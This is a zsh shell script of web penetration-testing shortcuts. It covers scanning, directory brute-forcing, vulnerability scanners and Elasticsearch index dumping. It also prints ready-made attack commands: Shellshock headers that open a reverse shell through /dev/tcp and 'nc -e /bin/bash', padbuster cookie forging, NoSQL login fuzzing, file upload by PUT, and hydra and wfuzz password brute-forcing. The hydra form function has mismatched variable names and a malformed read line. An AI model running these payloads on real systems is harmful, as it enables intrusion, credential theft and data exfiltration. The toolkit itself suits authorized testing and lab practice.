#!/usr/bin/env zsh

############################################################# 
# Web
#############################################################

qq-enum-web-sweep-nmap() {
  local subnet && read "subnet?Subnet (range): "
  print -z "nmap -n -Pn -sS -p80,443,8080 -oA web_sweep ${subnet} && \
  grep open web_sweep.gnmap |cut -d' ' -f2 > web_hosts.txt"
}

qq-enum-web-tcpdump() {
  local i && read "i?Interface: "
  local r && read "r?Remote Host: "
  print -z "tcpdump -i ${i} host ${r} and tcp port 80 -w web.${r}.pcap"
}

qq-enum-web-whatweb() {
  local s && read "s?Search: "
  print -z "whatweb ${s} -a 3"
}

qq-enum-web-scope-burp() {
  print -z ".*\.domain\.com$"
}

# vhosts

qq-enum-web-vhosts-gobuster() {
  local u && read "u?Url: "
  print -z "gobuster vhost -u ${u} -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt \
  -a \"${__UA}\" -t20 -o web.vhosts.gobuster.txt"
}

# dirs and files

qq-enum-web-dirs-robots() {
  local u && read "u?Url: "
  print -z "curl -v --user-agent \"${__UA}\" ${u}/robots.txt > web.robots.txt"
}

qq-enum-web-dirs-robots-parsero() {
  local u && read "u?Url: "
  print -z "parsero -u ${u} -o -sb > web.parsero.txt"
}

qq-enum-web-dirs-wfuzz() {
  local u && read "u?Url: "
  print -z "wfuzz -c -v -L -s 0.1 -w ${__WORDS_RAFT_DIRS} -R2 --hc=404 --hh=100 ${u}/FUZZ "
}

qq-enum-web-files-wfuzz() {
  local u && read "u?Url: "
  print -z "wfuzz -c -v -L -s 0.1 -w ${__WORDS_RAFT_FILES} -R2 --hc=404 --hh=100 ${u}/FUZZ "
}

qq-enum-web-dirs-ffuf() {
  local u && read "u?Url: "
  print -z "ffuf -r -w ${__WORDS_RAFT_DIRS} -u ${u}/FUZZ -fs 100 -fc 404"
}

qq-enum-web-files-ffuf() {
  local u && read "u?Url: "
  print -z "ffuf -r -w ${__WORDS_RAFT_FILES} -u ${u}/FUZZ -fs 100 -fc 404"
}

qq-enum-web-dirs-gobuster() {
  local u && read "u?Url: "
  print -z "gobuster dir -u ${u} -w ${__WORDS_RAFT_DIRS} -a \"${__UA}\" -t20 -r -k -o gobuster-dirs.txt"
}

qq-enum-web-files-gobuster() {
  local u && read "u?Url: "
  print -z "gobuster dir -u ${u} -w ${__WORDS_RAFT_FILES} -a \"${__UA}\" -t20 -r -k -o gobuster-files.txt"
}

# fuzz

qq-enum-web-fuzz-post-json-ffuf() {
  local u && read "u?Url: "
  print -z "ffuf -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -u ${u} -X POST -H \"Content-Type: application/json\" -d '{\"username\": \"FUZZ\", \"password\": \"FUZZ\"}' -fr \"error\" "
}

# screens

qq-enum-web-screens-eyewitness() {
  local f && read "f?File(urls): "
  local d && read "d?Directory: "
  mkdir ./${d}
  print -z "eyewitness.py --web -f ${f} -d ./${d} --user-agent \"${__UA}\" "
}

# vuln scanners

qq-enum-web-vuln-nikto() {
  local u && read "u?Url: "
  print -z "nikto -C all -useragent \"${__UA}\" -h ${u} -output web.nikto.log"
}

qq-enum-web-vuln-nmap-rfi() {
  local r && read "r?Remote Host: "
  print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' -oN web.rfi.nmap ${r}"
}

qq-enum-web-vuln-shellshock-cookie() {
  local l && read "l?Local Host: "
  local port && read "port?Local Port: "
  print -z "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/${l}/${port} 0>&1"
}

qq-enum-web-vuln-shellshock-nc() {
  local l && read "l?Local Host: "
  local r && read "r?Remote Host: "
  local port && read "port?Local Port: "
  print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${l} ${port} -e /bin/bash\"' http://${r}/cgi-bin/status"
}

qq-enum-web-vuln-put-curl() {
  local r && read "r?Remote Host: "
  local f && read "f?File: "
  print -z "curl -T ${f} http://${r}/${f}"
}

qq-enum-web-vuln-padbuster-check() {
  local r && read "r?Remote Host: "
  local cn && read "cn?Cookie Name: "
  local cv && read "cv?Cookie Value: "
  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
}

qq-enum-web-vuln-padbuster-forge() {
  local r && read "r?Remote Host: "
  local cn && read "cn?Cookie Name: "
  local cv && read "cv?Cookie Value: "
  local u && read "u?Username: "
  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${u}"
}

# apps

qq-enum-web-app-wordpress() {
  local u && read "u?Url: "
  print -z "wpscan --url ${u} --enumerate tt,vt,u,vp"
}

# elastic search

qq-enum-web-app-elastic-health() {
  local u && read "u?Url(:9200): "
  print -z "curl -XGET ${u}:9200/_cluster/health?pretty"
}

qq-enum-web-app-elastic-indices() {
  local u && read "u?Url(:9200): "
  print -z "curl -XGET ${u}:9200/_cat/indices?v"
}

qq-enum-web-app-elastic-search() {
  local u && read "u?Url(:9200): "
  local index && read "index?Index: "
  local query && read "query?Query: "
  __info "example query: *:password"
  print -z "curl -XGET ${u}:9200/${index}/_search?q=${query}&size=10&pretty"
}

qq-enum-web-app-elastic-all() {
  local u && read "u?Url(:9200): "
  local index && read "index?Index: "
  print -z "curl -XGET ${u}:9200/${index}/_search?size=1000 > documents.json"
}

# brute

qq-enum-web-brute-wfuzz-auth-post() {
  local r && read "r?Remote Host: "
  local u && read "u?Username field: "
  local user && read "user?User: "
  local p && read "p?password field: "
  local f && read "f?form: "
  print -z "wfuzz -c -w ${__PASS_ROCKYOU} -d \"${u}=${user}&${p}=FUZZ\" --sc 302 http://${r}/${f}"
}

qq-enum-web-brute-hydra-get() {
  local r && read "r?Remote Host: "
  local user && read "user?Username: "
  local path && read "path?Path: "
  print -z "hydra -l ${user} -P ${__PASS_ROCKYOU} ${r} http-get /${path}"
}

qq-enum-web-brute-hydra-form-post() {
  local r && read "r?Remote Host: "
  local u && read "u?Username: "
  local path && read "path?Path: "
  local uf && read "uf?Username Field: "
  local pf && read "up?Password Field: "
  local fm && read"fm?Failed Message: "
  print -z "hydra ${r} http-form-post \"${path}:${uf}=^USER^&${up}=^PASS^:${fm}\" -l $u -P ${__PASS_ROCKYOU} -t 10 -w 30 "
}

# Notes 

qq-enum-web-notes-drupal() {
  glow -p ${__NOTES}/enum-web-app-drupal-notes.md
}

qq-enum-web-notes-wordpress() {
  glow -p ${__NOTES}/enum-web-app-wordpress-notes.md
}

qq-enum-web-notes-traversal() {
  glow -p ${__NOTES}/enum-web-dir-traversal.md
}

qq-enum-web-notes-bypass-upload() {
  glow -p ${__NOTES}/enum-web-bypasss-upload.md
}


